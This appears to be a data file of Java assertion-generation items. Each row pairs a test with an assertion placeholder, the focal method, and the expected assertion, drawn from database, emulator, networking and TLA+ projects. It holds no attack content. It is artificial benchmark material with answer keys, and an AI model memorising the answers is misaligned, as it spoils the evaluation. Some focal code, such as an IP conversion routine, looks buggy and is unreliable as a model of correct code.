"Exception { String res = ""{""properties"":[{""type"":""TINYINT"",""name"":""k1"",""comment"":""""},{""name"":""k5"","" + """"scale"":""0"",""comment"":"""",""type"":""DECIMALV2"",""precision"":""9""},{""name"":""k6"","" + """"scale"":""9"",""comment"":"""",""type"":""DECIMAL128"",""precision"":""30""}],""status"":200}""; Schema expected = new Schema(); expected.setStatus(200); Field k1 = new Field(""k1"", ""TINYINT"", """", 0, 0); Field k5 = new Field(""k5"", ""DECIMALV2"", """", 9, 0); Field k6 = new Field(""k6"", ""DECIMAL128"", """", 30, 9); expected.put(k1); expected.put(k5); expected.put(k6); Assert.""<AssertPlaceHolder>"";  String notJsonRes = ""not json""; thrown.expect(StarrocksException.class); thrown.expectMessage(startsWith(""StarRocks FE's response is not a json. res:"")); RestService.parseSchema(notJsonRes, logger);  String notSchemaRes = ""{""property"":[{""type"":""TINYINT"",""name"":""k1"",""comment"":""""},"" + ""{""name"":""k5"",""scale"":""0"",""comment"":"""",""type"":""DECIMALV2"",""precision"":""9""}],"" + """"status"":200}""; thrown.expect(StarrocksException.class); thrown.expectMessage(startsWith(""StarRocks FE's response cannot map to schema. res: "")); RestService.parseSchema(notSchemaRes, logger);  String notOkRes = ""{""properties"":[{""type"":""TINYINT"",""name"":""k1"",""comment"":""""},{""name"":""k5"","" + """"scale"":""0"",""comment"":"""",""type"":""DECIMALV2"",""precision"":""9""}],""status"":20}""; thrown.expect(StarrocksException.class); thrown.expectMessage(startsWith(""StarRocks FE's response is not OK, status is "")); RestService.parseSchema(notOkRes, logger); }
parseSchema(String response, Logger logger) throws StarrocksException { logger.trace(""Parse response '{}' to schema."", response); ObjectMapper mapper = new ObjectMapper(); Schema schema; try { schema = mapper.readValue(response, Schema.class); } catch (JsonParseException e) { String errMsg = ""StarRocks FE's response is not a json. res: "" + response; logger.error(errMsg, e); throw new StarrocksException(errMsg, e); } catch (JsonMappingException e) { String errMsg = ""StarRocks FE's response cannot map to schema. res: "" + response; logger.error(errMsg, e); throw new StarrocksException(errMsg, e); } catch (IOException e) { String errMsg = ""Parse StarRocks FE's response to json failed. res: "" + response; logger.error(errMsg, e); throw new StarrocksException(errMsg, e); }  if (schema == null) { logger.error(SHOULD_NOT_HAPPEN_MESSAGE); throw new ShouldNeverHappenException(); }  if (schema.getStatus() != REST_RESPONSE_STATUS_OK) { String errMsg = ""StarRocks FE's response is not OK, status is "" + schema.getStatus(); logger.error(errMsg); throw new StarrocksException(errMsg); } logger.debug(""Parsing schema result is '{}'."", schema); return schema; }"	assertEquals(expected, RestService.parseSchema(res, logger))
"Exception { List<Long> tablets1 = new ArrayList<>(); tablets1.add(1L); tablets1.add(2L); List<Long> tablets2 = new ArrayList<>(); tablets2.add(3L); tablets2.add(4L); Map<String, List<Long>> beToTablets = new HashMap<>(); beToTablets.put(""be1"", tablets1); beToTablets.put(""be2"", tablets2);  Settings settings = new PropertiesSettings(); String opaquedQueryPlan = ""query_plan""; String cluster = ""c""; String database = ""d""; String table = ""t"";  Set<Long> be1Tablet = new HashSet<>(); be1Tablet.add(1L); be1Tablet.add(2L); PartitionDefinition pd1 = new PartitionDefinition( database, table, settings, ""be1"", be1Tablet, opaquedQueryPlan);  Set<Long> be2Tablet = new HashSet<>(); be2Tablet.add(3L); be2Tablet.add(4L); PartitionDefinition pd2 = new PartitionDefinition( database, table, settings, ""be2"", be2Tablet, opaquedQueryPlan);  List<PartitionDefinition> expected = new ArrayList<>(); expected.add(pd1); expected.add(pd2); Collections.sort(expected);  List<PartitionDefinition> actual = RestService.tabletsMapToPartition( settings, beToTablets, opaquedQueryPlan, database, table, logger); Collections.sort(actual);  Assert.""<AssertPlaceHolder>""; }
tabletsMapToPartition(Settings cfg, Map<String, List<Long>> be2Tablets, String opaquedQueryPlan, String database, String table, Logger logger) throws IllegalArgumentException { int tabletsSize = tabletCountLimitForOnePartition(cfg, logger); List<PartitionDefinition> partitions = new ArrayList<>(); for (Map.Entry<String, List<Long>> beInfo : be2Tablets.entrySet()) { logger.debug(""Generate partition with beInfo: '{}'."", beInfo); HashSet<Long> tabletSet = new HashSet<>(beInfo.getValue()); beInfo.getValue().clear(); beInfo.getValue().addAll(tabletSet); int first = 0; while (first < beInfo.getValue().size()) { Set<Long> partitionTablets = new HashSet<>(beInfo.getValue().subList( first, Math.min(beInfo.getValue().size(), first + tabletsSize))); first = first + tabletsSize; PartitionDefinition partitionDefinition = new PartitionDefinition(database, table, cfg, beInfo.getKey(), partitionTablets, opaquedQueryPlan); logger.debug(""Generate one PartitionDefinition '{}'."", partitionDefinition); partitions.add(partitionDefinition); } } return partitions; }"	assertEquals(expected, actual)
"Exception { Bus mockBus = mock(Bus.class);  Acia acia = newAcia(); acia.setBus(mockBus);  // Disable TX IRQ, Enable RX IRQ acia.write(CMD_STAT_REG, 0x80);  acia.rxWrite('a');  // Receive should cause IRQ flag to be set ""<AssertPlaceHolder>""; }
read(int address, boolean cpuAccess) throws MemoryAccessException { switch (address) { case RX_REG: return rxRead(cpuAccess); case STAT_REG: return statusReg(cpuAccess);  default: throw new MemoryAccessException(""No register.""); } }"	assertEquals(0x80, acia.read(0x0000, true) & 0x80)
"Exception { Bus mockBus = mock(Bus.class);  Acia acia = newAcia(); acia.setBus(mockBus);  // Disable TX IRQ, Disable RX IRQ acia.write(CMD_STAT_REG, 0x00);  acia.rxWrite('a');  // Receive should not cause IRQ flag to be set ""<AssertPlaceHolder>""; }
read(int address, boolean cpuAccess) throws MemoryAccessException { switch (address) { case RX_REG: return rxRead(cpuAccess); case STAT_REG: return statusReg(cpuAccess);  default: throw new MemoryAccessException(""No register.""); } }"	assertEquals(0x00, acia.read(0x0000, true) & 0x80)
"Exception { Bus mockBus = mock(Bus.class);  Acia acia = newAcia(); acia.setBus(mockBus);  // Disable TX IRQ, Disable RX IRQ acia.write(CMD_STAT_REG, 0x02);  // Write data acia.write(DATA_REG, 'a');  // Transmission should not cause IRQ flag to be set acia.txRead(true);  ""<AssertPlaceHolder>""; }
read(int address, boolean cpuAccess) throws MemoryAccessException { switch (address) { case RX_REG: return rxRead(cpuAccess); case STAT_REG: return statusReg(cpuAccess);  default: throw new MemoryAccessException(""No register.""); } }"	assertEquals(0x00, acia.read(0x0000, true) & 0x80)
"Exception { Acia acia = newAcia();  ""<AssertPlaceHolder>""; }
read(int address, boolean cpuAccess) throws MemoryAccessException { switch (address) { case RX_REG: return rxRead(cpuAccess); case STAT_REG: return statusReg(cpuAccess);  default: throw new MemoryAccessException(""No register.""); } }"	assertEquals(0x02, acia.read(CMD_STAT_REG, true) & 0x02)
"Exception { Acia acia = newAcia();  acia.txWrite('a'); ""<AssertPlaceHolder>""; }
read(int address, boolean cpuAccess) throws MemoryAccessException { switch (address) { case RX_REG: return rxRead(cpuAccess); case STAT_REG: return statusReg(cpuAccess);  default: throw new MemoryAccessException(""No register.""); } }"	assertEquals(0x00, acia.read(CMD_STAT_REG, true) & 0x02)
"Exception { Acia acia = newAcia();  acia.rxWrite('a');  ""<AssertPlaceHolder>""; }
read(int address, boolean cpuAccess) throws MemoryAccessException { switch (address) { case RX_REG: return rxRead(cpuAccess); case STAT_REG: return statusReg(cpuAccess);  default: throw new MemoryAccessException(""No register.""); } }"	assertEquals(0x01, acia.read(CMD_STAT_REG, true) & 0x01)
"Exception { Bus mockBus = mock(Bus.class);  Acia acia = new Acia6551(0x000); acia.setBus(mockBus);  // Disable TX IRQ, Enable RX IRQ acia.write(2, 0x00);  acia.rxWrite('a');  // Receive should cause IRQ flag to be set ""<AssertPlaceHolder>""; }
rxWrite(int data) { if (rxFull) { overrun = true; }  rxFull = true;  if (receiveIrqEnabled) { interrupt = true; getBus().assertIrq(); }  rxChar = data; }"	assertEquals(0x80, acia.read(0x0001, true) & 0x80)
"Exception { Bus mockBus = mock(Bus.class);  Acia acia = new Acia6551(0x000); acia.setBus(mockBus);  // Disable TX IRQ, Disable RX IRQ acia.write(2, 0x02);  acia.rxWrite('a');  // Receive should not cause IRQ flag to be set ""<AssertPlaceHolder>""; }
rxWrite(int data) { if (rxFull) { overrun = true; }  rxFull = true;  if (receiveIrqEnabled) { interrupt = true; getBus().assertIrq(); }  rxChar = data; }"	assertEquals(0x00, acia.read(0x0001, true) & 0x80)
"Exception { Bus mockBus = mock(Bus.class);  Acia acia = new Acia6551(0x000); acia.setBus(mockBus);  // Disable TX IRQ, Disable RX IRQ acia.write(2, 0x02);  // Write data acia.write(0, 'a');  // Transmission should not cause IRQ flag to be set acia.txRead(true);  ""<AssertPlaceHolder>""; }
txRead(boolean cpuAccess) { if (cpuAccess) { txEmpty = true;  if (transmitIrqEnabled) { interrupt = true; getBus().assertIrq(); } } return txChar; }"	assertEquals(0x00, acia.read(0x0001, true) & 0x80)
"Exception { Acia acia = new Acia6551(0x000);  acia.txWrite('a'); ""<AssertPlaceHolder>""; }
txWrite(int data) { lastTxWrite = System.nanoTime(); txChar = data; txEmpty = false; }"	assertEquals(0x00, acia.read(0x0001, true))
"Exception { Acia acia = new Acia6551(0x000);  acia.rxWrite('a'); ""<AssertPlaceHolder>""; }
rxWrite(int data) { if (rxFull) { overrun = true; }  rxFull = true;  if (receiveIrqEnabled) { interrupt = true; getBus().assertIrq(); }  rxChar = data; }"	assertEquals(0x18, acia.read(0x0001, true))
"Exception { crtc.write(0, 8); crtc.write(1, 0); // Select straight binary addressing  // Fill the memory with a repeating pattern int videoMemoryBase = 0x7000; int j = 0;  for (int i = 0; i < 2048; i++) { memory.write(videoMemoryBase + i, j); if (j == 255) { j = 0; } else { j++; } }  // Now verify that straight-binary addressing of the CRTC works j = 0;  for (int i = 0; i < 2048; i++) { ""<AssertPlaceHolder>""; if (j == 255) { j = 0; } else { j++; } } }
getCharAtAddress(int address) throws MemoryAccessException { // TODO: Row/Column addressing return memory.read(address, false); }"	assertEquals(j, crtc.getCharAtAddress(videoMemoryBase + i))
"getIp() { TreeMultimap<Integer, Integer> treeMap = TreeMultimap.create(); treeMap.put(3, 5); treeMap.put(3, 6); treeMap.put(4, 7); treeMap.put(2, 7); for (Integer i : treeMap.values()) { System.out.println(i); } ""<AssertPlaceHolder>""; }
getIp() { if (null != ip) { return ip; }  if (System.getProperty(""os.name"").contains(""Mac OS X"")) { ip = getIpByName(""en0""); } else { ip = getIpByName(""bond0""); }  ip = ip.replace(""/"", """"); return ip; }"	assertNotNull(IpUtil.getIp())
"URISyntaxException { String configFile = ""./test/data/petclinic/tkltest_ui_config.toml""; String[] args = { ""--config-file"", configFile }; // run crawljax on app CrawljaxRunner.main(args);  // assert that the output directory is created String outDir = getOutputDirectoryName(configFile); Assert.""<AssertPlaceHolder>""; deleteDir(outDir); }
main(String[] args) throws IOException, URISyntaxException { // parse command-line options CommandLine cmd = parseCommandLineOptions(args);  // if parser command-line is empty (which occurs if the help option is specified, a parse // exception occurs, or any required option is not provided, exit if (cmd == null) { System.exit(0); }  // parse toml file and check for errors String configFilename = cmd.getOptionValue(""cf""); logger.info(""Testgen config plan file: "" + configFilename); TomlParseResult parsedConfig = Toml.parse(Paths.get(configFilename)); if (parsedConfig.hasErrors()) { // print parse errors and exit System.out.println(""Error parsing ""+configFilename+"":""); for (TomlParseError parseError : parsedConfig.errors()) { System.out.println(""  - ""+parseError.toString()); } System.exit(1); }  String appName = parsedConfig.getString(""general.app_name""); String appUrl = parsedConfig.getString(""general.app_url""); String testDir = parsedConfig.getString(""general.test_directory""); TomlTable generateOptions = parsedConfig.getTable(""generate"");  // set output directory if not specified in config URI appUri = URI.create(appUrl); if (testDir == null || testDir.isEmpty()) { testDir = createOutputDirectoryName(appName, appUri, generateOptions.getLong(""time_limit"")); } logger.info(""app_name=""+appName+"" app_url=""+appUrl+"" test_directory=""+testDir); logger.info(""generate options: ""+generateOptions.keySet());  // create crawljax configuration CrawljaxConfiguration crawljaxConfig = null; try { crawljaxConfig = createCrawljaxConfiguration(appUrl, testDir, generateOptions); logger.info(""Crawljax configuration created: "" + crawljaxConfig.toString()); } catch (Exception re) { logger.severe(""Error creating Crawljax configuration: ""+re.getMessage()); re.printStackTrace(); System.exit(1); }  // run crawljax com.crawljax.core.CrawljaxRunner crawljaxRunner = new com.crawljax.core.CrawljaxRunner(crawljaxConfig); crawljaxRunner.call();  // move directory //        moveDirectory(testDir, appUri);  }"	assertTrue(Files.exists(Paths.get(outDir)))
"URISyntaxException { String configFile = ""./test/data/petclinic/tkltest_ui_config_nonfrag.toml""; String[] args = { ""--config-file"", configFile }; // run crawljax on app CrawljaxRunner.main(args);  // assert that the output directory is created String outDir = getOutputDirectoryName(configFile); Assert.""<AssertPlaceHolder>""; deleteDir(outDir); }
main(String[] args) throws IOException, URISyntaxException { // parse command-line options CommandLine cmd = parseCommandLineOptions(args);  // if parser command-line is empty (which occurs if the help option is specified, a parse // exception occurs, or any required option is not provided, exit if (cmd == null) { System.exit(0); }  // parse toml file and check for errors String configFilename = cmd.getOptionValue(""cf""); logger.info(""Testgen config plan file: "" + configFilename); TomlParseResult parsedConfig = Toml.parse(Paths.get(configFilename)); if (parsedConfig.hasErrors()) { // print parse errors and exit System.out.println(""Error parsing ""+configFilename+"":""); for (TomlParseError parseError : parsedConfig.errors()) { System.out.println(""  - ""+parseError.toString()); } System.exit(1); }  String appName = parsedConfig.getString(""general.app_name""); String appUrl = parsedConfig.getString(""general.app_url""); String testDir = parsedConfig.getString(""general.test_directory""); TomlTable generateOptions = parsedConfig.getTable(""generate"");  // set output directory if not specified in config URI appUri = URI.create(appUrl); if (testDir == null || testDir.isEmpty()) { testDir = createOutputDirectoryName(appName, appUri, generateOptions.getLong(""time_limit"")); } logger.info(""app_name=""+appName+"" app_url=""+appUrl+"" test_directory=""+testDir); logger.info(""generate options: ""+generateOptions.keySet());  // create crawljax configuration CrawljaxConfiguration crawljaxConfig = null; try { crawljaxConfig = createCrawljaxConfiguration(appUrl, testDir, generateOptions); logger.info(""Crawljax configuration created: "" + crawljaxConfig.toString()); } catch (Exception re) { logger.severe(""Error creating Crawljax configuration: ""+re.getMessage()); re.printStackTrace(); System.exit(1); }  // run crawljax com.crawljax.core.CrawljaxRunner crawljaxRunner = new com.crawljax.core.CrawljaxRunner(crawljaxConfig); crawljaxRunner.call();  // move directory //        moveDirectory(testDir, appUri);  }"	assertTrue(Files.exists(Paths.get(outDir)))
"URISyntaxException { String configFile = ""./test/data/addressbook/tkltest_ui_config.toml""; String[] args = { ""--config-file"", configFile }; // run crawljax on app CrawljaxRunner.main(args);  // assert that the output directory is created String outDir = getOutputDirectoryName(configFile); Assert.""<AssertPlaceHolder>""; deleteDir(outDir); }
main(String[] args) throws IOException, URISyntaxException { // parse command-line options CommandLine cmd = parseCommandLineOptions(args);  // if parser command-line is empty (which occurs if the help option is specified, a parse // exception occurs, or any required option is not provided, exit if (cmd == null) { System.exit(0); }  // parse toml file and check for errors String configFilename = cmd.getOptionValue(""cf""); logger.info(""Testgen config plan file: "" + configFilename); TomlParseResult parsedConfig = Toml.parse(Paths.get(configFilename)); if (parsedConfig.hasErrors()) { // print parse errors and exit System.out.println(""Error parsing ""+configFilename+"":""); for (TomlParseError parseError : parsedConfig.errors()) { System.out.println(""  - ""+parseError.toString()); } System.exit(1); }  String appName = parsedConfig.getString(""general.app_name""); String appUrl = parsedConfig.getString(""general.app_url""); String testDir = parsedConfig.getString(""general.test_directory""); TomlTable generateOptions = parsedConfig.getTable(""generate"");  // set output directory if not specified in config URI appUri = URI.create(appUrl); if (testDir == null || testDir.isEmpty()) { testDir = createOutputDirectoryName(appName, appUri, generateOptions.getLong(""time_limit"")); } logger.info(""app_name=""+appName+"" app_url=""+appUrl+"" test_directory=""+testDir); logger.info(""generate options: ""+generateOptions.keySet());  // create crawljax configuration CrawljaxConfiguration crawljaxConfig = null; try { crawljaxConfig = createCrawljaxConfiguration(appUrl, testDir, generateOptions); logger.info(""Crawljax configuration created: "" + crawljaxConfig.toString()); } catch (Exception re) { logger.severe(""Error creating Crawljax configuration: ""+re.getMessage()); re.printStackTrace(); System.exit(1); }  // run crawljax com.crawljax.core.CrawljaxRunner crawljaxRunner = new com.crawljax.core.CrawljaxRunner(crawljaxConfig); crawljaxRunner.call();  // move directory //        moveDirectory(testDir, appUri);  }"	assertTrue(Files.exists(Paths.get(outDir)))
"URISyntaxException { String configFile = ""./test/data/addressbook/tkltest_ui_config_nonfrag.toml""; String[] args = { ""--config-file"", configFile }; // run crawljax on app CrawljaxRunner.main(args);  // assert that the output directory is created String outDir = getOutputDirectoryName(configFile); Assert.""<AssertPlaceHolder>""; deleteDir(outDir); }
main(String[] args) throws IOException, URISyntaxException { // parse command-line options CommandLine cmd = parseCommandLineOptions(args);  // if parser command-line is empty (which occurs if the help option is specified, a parse // exception occurs, or any required option is not provided, exit if (cmd == null) { System.exit(0); }  // parse toml file and check for errors String configFilename = cmd.getOptionValue(""cf""); logger.info(""Testgen config plan file: "" + configFilename); TomlParseResult parsedConfig = Toml.parse(Paths.get(configFilename)); if (parsedConfig.hasErrors()) { // print parse errors and exit System.out.println(""Error parsing ""+configFilename+"":""); for (TomlParseError parseError : parsedConfig.errors()) { System.out.println(""  - ""+parseError.toString()); } System.exit(1); }  String appName = parsedConfig.getString(""general.app_name""); String appUrl = parsedConfig.getString(""general.app_url""); String testDir = parsedConfig.getString(""general.test_directory""); TomlTable generateOptions = parsedConfig.getTable(""generate"");  // set output directory if not specified in config URI appUri = URI.create(appUrl); if (testDir == null || testDir.isEmpty()) { testDir = createOutputDirectoryName(appName, appUri, generateOptions.getLong(""time_limit"")); } logger.info(""app_name=""+appName+"" app_url=""+appUrl+"" test_directory=""+testDir); logger.info(""generate options: ""+generateOptions.keySet());  // create crawljax configuration CrawljaxConfiguration crawljaxConfig = null; try { crawljaxConfig = createCrawljaxConfiguration(appUrl, testDir, generateOptions); logger.info(""Crawljax configuration created: "" + crawljaxConfig.toString()); } catch (Exception re) { logger.severe(""Error creating Crawljax configuration: ""+re.getMessage()); re.printStackTrace(); System.exit(1); }  // run crawljax com.crawljax.core.CrawljaxRunner crawljaxRunner = new com.crawljax.core.CrawljaxRunner(crawljaxConfig); crawljaxRunner.call();  // move directory //        moveDirectory(testDir, appUri);  }"	assertTrue(Files.exists(Paths.get(outDir)))
"testGet() { try { String result = PoolHttpClient.get(""https://www.baidu.com/""); Assert.""<AssertPlaceHolder>""; } catch (Exception e) { fail(""Unexpect an exception: "" + e.getMessage()); } }
get(String url) throws IOException { try { return get(url, null); } catch (Exception e) { throw new IOException(e); } }"	assertNotNull(result)
"localhostTest() { var localHostStr = NetUtils.getLocalhostStr(); var localHost = NetUtils.getLocalhost(); Assert.""<AssertPlaceHolder>""; }
getLocalhost() { var address = getAllAddress().stream() .filter(it -> !it.isLoopbackAddress() // 非地区本地地址，指10.0.0.0 ~ 10.255.255.255、172.16.0.0 ~ 172.31.255.255、192.168.0.0 ~ 192.168.255.255 && it.isSiteLocalAddress() // 需为IPV4地址 && it instanceof Inet4Address && !it.getHostAddress().contains("":"")) .findFirst();  if (address.isPresent()) { return address.get(); }  try { return InetAddress.getLocalHost(); } catch (UnknownHostException e) { return null; } }"	assertEquals(localHostStr, localHost.getHostAddress())
"ipv4Test() { var ipLong = NetUtils.ipv4ToLong(NetUtils.LOCAL_LOOPBACK_IP); var ipStr = NetUtils.longToIpv4(ipLong); Assert.""<AssertPlaceHolder>""; }
longToIpv4(long longIP) { final StringBuilder sb = new StringBuilder(); // 直接右移24位 sb.append((longIP / 1_000_000_000)); sb.append("".""); // 将高8位置0，然后右移16位 sb.append(longIP / 1_000_000 % 1_000); sb.append("".""); sb.append(longIP / 1_000 % 1_000); sb.append("".""); sb.append(longIP % 1_000); return sb.toString(); }"	assertEquals(ipStr, NetUtils.LOCAL_LOOPBACK_IP)
"isInnerIpTest() { Assert.""<AssertPlaceHolder>""; }
isInnerIP(String ipAddress) { long ipNum = NetUtils.ipv4ToLong(ipAddress);  long aBegin = NetUtils.ipv4ToLong(""10.0.0.0""); long aEnd = NetUtils.ipv4ToLong(""10.255.255.255"");  long bBegin = NetUtils.ipv4ToLong(""172.16.0.0""); long bEnd = NetUtils.ipv4ToLong(""172.31.255.255"");  long cBegin = NetUtils.ipv4ToLong(""192.168.0.0""); long cEnd = NetUtils.ipv4ToLong(""192.168.255.255"");  boolean isInnerIp = isInner(ipNum, aBegin, aEnd) || isInner(ipNum, bBegin, bEnd) || isInner(ipNum, cBegin, cEnd) || ipAddress.equals(LOCAL_LOOPBACK_IP); return isInnerIp; }"	assertTrue(NetUtils.isInnerIP(NetUtils.LOCAL_LOOPBACK_IP))
"test() { for (int i = 0; i < 10; i++) { var passWord = ""hello world""; var encodePassWorld = AesUtils.getEncryptString(passWord); Assert.""<AssertPlaceHolder>""; } }
getDecryptString(String str) { try { var base64Decoder = Base64.getDecoder(); var strBytes = base64Decoder.decode(str); var decryptStrBytes = decrypt(strBytes); return StringUtils.bytesToString(decryptStrBytes); } catch (Exception e) { throw new RuntimeException(e); } }"	assertEquals(passWord, AesUtils.getDecryptString(encodePassWorld))
"md5Test() { var str = ""qwerasdfzxcv1234;:'""; Assert.""<AssertPlaceHolder>""; }
bytesToMD5(byte[] bytes) { try {  var messageDigest = MessageDigest.getInstance(MD5_ALGORITHM); // inputByteArray是输入字符串转换得到的字节数组 messageDigest.update(bytes);  // 转换并返回结果，也是字节数组，包含16个元素 // 字符数组转换成字符串返回，MD5将任意长度的字节数组变换成一个16个字节，128bit的大整数 return byteArrayToHex(messageDigest.digest()); } catch (NoSuchAlgorithmException e) { throw new RuntimeException(""MD加密出现未知异常"", e); } }"	assertEquals(MD5Utils.bytesToMD5(str.getBytes()).toLowerCase(), DigestUtils.md5DigestAsHex(str.getBytes()))
"stringTest() { String str = ""hello""; ByteBuf byteBuf = Unpooled.buffer(); ByteBufUtils.writeString(byteBuf, str); String result = ByteBufUtils.readString(byteBuf); Assert.""<AssertPlaceHolder>""; }
readString(ByteBuf byteBuf) { int length = readInt(byteBuf); return length <= 0 ? StringUtils.EMPTY : (String) byteBuf.readCharSequence(length, StringUtils.DEFAULT_CHARSET); }"	assertEquals(result, str)
"testPrimeNumberChecker() { System.out.println(""Parameterized Number is : "" + inputNumber); Assert.""<AssertPlaceHolder>""; }
validate(final Integer parimeNumber) { for (int i = 2; i < (parimeNumber / 2); i++) { if (parimeNumber % i == 0) { return false; } } return true; }"	assertEquals(expectedResult, primeNumberChecker.validate(inputNumber))
"add() { cal.add(2,2); ""<AssertPlaceHolder>""; }
getResult() { return this.result; }"	assertEquals(4,cal.getResult())
"subtract() { cal.subtract(4,2); ""<AssertPlaceHolder>""; }
getResult() { return this.result; }"	assertEquals(2,cal.getResult())
"Exception {  // Get a workflow stub using the same task queue the worker uses. GreetingWorkflow workflow = testWorkflowRule .getWorkflowClient() .newWorkflowStub( GreetingWorkflow.class, WorkflowOptions.newBuilder().setTaskQueue(testWorkflowRule.getTaskQueue()).build());  WorkflowClient.start(workflow::greet, testCustomer);  Thread.sleep( 5 * 1000); // Execute a workflow waiting for it to complete. //String greeting = workflow.greet(testCustomer); //""<AssertPlaceHolder>"";  testWorkflowRule.getTestEnvironment().shutdown();  // Note to self, ADD A SUPER LONG SLEEP to show time advance and run again }
greet(Customer customer);"	"assertEquals(""Hello "" + testCustomer.getName(), greeting)"
"Exception { SharedTestUtilitiesJUnit4.runTestsAndAssertNoFailures( new PluggableTestRunner(TestAndMethodRuleTestClass.class) { @Override protected TestMethodProcessorList createTestMethodProcessorList() { return TestMethodProcessorList.empty(); } });  ""<AssertPlaceHolder>""; }
createTestMethodProcessorList();  /** * This method is run to perform optional additional operations on the test instance, right after * it was created. */ protected void finalizeCreatedTestInstance(Object testInstance) { // Do nothing by default }"	assertThat(ruleInvocations).hasSize(1)
"Exception { SharedTestUtilitiesJUnit4.runTestsAndAssertNoFailures( new PluggableTestRunner(RuleOrderingTestClassWithExplicitOrder.class) { @Override protected TestMethodProcessorList createTestMethodProcessorList() { return TestMethodProcessorList.empty(); } });  ""<AssertPlaceHolder>""; }
createTestMethodProcessorList();  /** * This method is run to perform optional additional operations on the test instance, right after * it was created. */ protected void finalizeCreatedTestInstance(Object testInstance) { // Do nothing by default }"	"assertThat(ruleInvocations).containsExactly(""B"", ""C"", ""A"").inOrder()"
"Exception { testMethodInvocationCount = 0; SharedTestUtilitiesJUnit4.runTestsAndAssertNoFailures( new PluggableTestRunner(CustomTestAnnotationTestClass.class) { @Override protected TestMethodProcessorList createTestMethodProcessorList() { return TestMethodProcessorList.empty(); }  @Override protected ImmutableList<Class<? extends Annotation>> getSupportedTestAnnotations() { return ImmutableList.of(Test.class, CustomTest.class); } });  ""<AssertPlaceHolder>""; }
getSupportedTestAnnotations() { return ImmutableList.of(Test.class); }"	assertThat(testMethodInvocationCount).isEqualTo(2)
"Exception { testOrder.clear(); SharedTestUtilitiesJUnit4.runTestsAndAssertNoFailures( new PluggableTestRunner(SortedPluggableTestRunnerTestClass.class) { @Override protected TestMethodProcessorList createTestMethodProcessorList() { return TestMethodProcessorList.empty(); }  @Override protected ImmutableList<FrameworkMethod> sortTestMethods( ImmutableList<FrameworkMethod> methods) { return FluentIterable.from(methods) .toSortedList((o1, o2) -> o2.getName().compareTo(o1.getName())); // reversed } }); ""<AssertPlaceHolder>""; }
getName() { return testInfo.getName(); }"	"assertThat(testOrder).containsExactly(""c"", ""b"", ""a"")"
"Exception { int speed1 = 5; AtomicInteger counter = new AtomicInteger(0); VirtualTimePeriodicTaskExecutor virtualClock = new VirtualTimePeriodicTaskExecutor(speed1, 1000, virtualCLockTime -> counter.incrementAndGet(), null, null); virtualClock.startFromTimestamp(0);  Thread.sleep(2000);  virtualClock.stop(); int counterValue = counter.get(); System.out.println(""counterValue: "" + counterValue); ""<AssertPlaceHolder>""; }
stop() { pause(); }"	"assertTrue(""Expected 10, got "" + counterValue, 9 <= counterValue && counterValue <= 11)"
"test_generate() {  // 1. Arrange String hllCode = Objects.requireNonNull(FileReaderUtil.getResourceFileAsString(""lexer/code.ck"")); List<Token> tokens = Lexer.tokenize(hllCode); AstNode oldAst = new Parser(tokens).parse(); SvgAstNode newAst = new Transformer().transform(oldAst);  // 2. Act String result = new CodeGenerator().generate(newAst);  // 3. Assert ""<AssertPlaceHolder>"";  // 4. Log System.out.println(result); saveToFile(result, ""src/test/resources/output/code.svg""); }
generate(SvgAstNode node) { return printAst(node); }"	assertNotNull(result)
"Exception { Result result = ExpressionEvaluator.evaluate(null, ""XYZ""); ""<AssertPlaceHolder>""; }
evaluate(@Nullable Context context, String expression) { String clazzName = ExpressionEvaluator.class.getName(); IsolatedClassLoader loader = new IsolatedClassLoader( ExpressionEvaluator.class.getClassLoader()); try { Class<?> clazz = loader.loadClass(clazzName); Method method = clazz.getDeclaredMethod(""evaluate0"", Context.class, String.class); return (Result) method.invoke(null, context, expression); } catch (IllegalAccessException | InvocationTargetException | NoSuchMethodException | ClassNotFoundException e) { throw new RuntimeException(e); } }"	"assertEquals(new Result("""", Arrays.asList( ""Parsing or semantic analysis failed."", ""line 6, col 14 to line 6, col 16 of module __dummy_module__\n\nUnknown operator: `XYZ'."" )), result)"
"Exception { Path path = Paths.get(getClass().getClassLoader().getResource(""tlaplus/run/eval"").toURI()); Context ctx = new Context(""Foo"", path); Result result = ExpressionEvaluator.evaluate(ctx, ""S""); ""<AssertPlaceHolder>""; }
evaluate(@Nullable Context context, String expression) { String clazzName = ExpressionEvaluator.class.getName(); IsolatedClassLoader loader = new IsolatedClassLoader( ExpressionEvaluator.class.getClassLoader()); try { Class<?> clazz = loader.loadClass(clazzName); Method method = clazz.getDeclaredMethod(""evaluate0"", Context.class, String.class); return (Result) method.invoke(null, context, expression); } catch (IllegalAccessException | InvocationTargetException | NoSuchMethodException | ClassNotFoundException e) { throw new RuntimeException(e); } }"	"assertEquals(new Result("""", Arrays.asList( ""Evaluating an expression of the form Append(s, v) when s is not a sequence:\n"" + ""(1 :> ""x"" @@ 3 :> ""x"")"" )), result)"
"Exception { Path path = Paths.get(getClass().getClassLoader().getResource(""tlaplus/run/eval"").toURI()); Context ctx = new Context(""Foo2"", path); Result result = ExpressionEvaluator.evaluate(ctx, ""T""); ""<AssertPlaceHolder>""; }
evaluate(@Nullable Context context, String expression) { String clazzName = ExpressionEvaluator.class.getName(); IsolatedClassLoader loader = new IsolatedClassLoader( ExpressionEvaluator.class.getClassLoader()); try { Class<?> clazz = loader.loadClass(clazzName); Method method = clazz.getDeclaredMethod(""evaluate0"", Context.class, String.class); return (Result) method.invoke(null, context, expression); } catch (IllegalAccessException | InvocationTargetException | NoSuchMethodException | ClassNotFoundException e) { throw new RuntimeException(e); } }"	"assertEquals(new Result(""55301\nTRUE"", Collections.emptyList()), result)"
"testPrintWithoutContext() { Result result = ExpressionEvaluator.evaluate(null, ""PrintT(3)""); ""<AssertPlaceHolder>""; }
evaluate(@Nullable Context context, String expression) { String clazzName = ExpressionEvaluator.class.getName(); IsolatedClassLoader loader = new IsolatedClassLoader( ExpressionEvaluator.class.getClassLoader()); try { Class<?> clazz = loader.loadClass(clazzName); Method method = clazz.getDeclaredMethod(""evaluate0"", Context.class, String.class); return (Result) method.invoke(null, context, expression); } catch (IllegalAccessException | InvocationTargetException | NoSuchMethodException | ClassNotFoundException e) { throw new RuntimeException(e); } }"	"assertEquals(new Result(""3\nTRUE"", Collections.emptyList()), result)"
"translate() { String input = TestUtils.resourceToString(""pluscal/translate/test.tla""); String expected = TestUtils.resourceToString(""pluscal/translate/test_expected.tla""); String actual = PlusCalTranslator.translate(input).getTranslated(); ""<AssertPlaceHolder>""; }
